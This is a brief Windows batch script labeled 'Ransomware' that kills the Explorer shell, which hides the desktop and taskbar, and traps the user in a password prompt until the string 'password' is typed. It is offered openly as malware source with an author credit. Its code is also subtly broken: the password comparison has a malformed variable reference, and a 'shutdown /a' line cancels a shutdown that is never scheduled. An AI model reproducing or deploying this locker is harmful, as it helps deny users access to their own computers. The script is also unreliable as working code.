@Echo off
taskkill /f /im explorer.exe
cls
color b
echo -------------------------
echo        Ransomware
echo -------------------------
echo Made by kiminkyu
echo Source: walando
:Password
Set inpot=
set /p inpot=Please enter the correct password:
if not %inpot&==password goto NO


:YES


cls
color b
echo --------------------------
echo YOUR COMPUTER IS UNLOCKED!
echo --------------------------
shutdown /a
start C:\Windows\explorer.exe
Exit


:NO


color b
echo -------------------
echo Incorrect Password!
echo -------------------
goto Password
pause>nul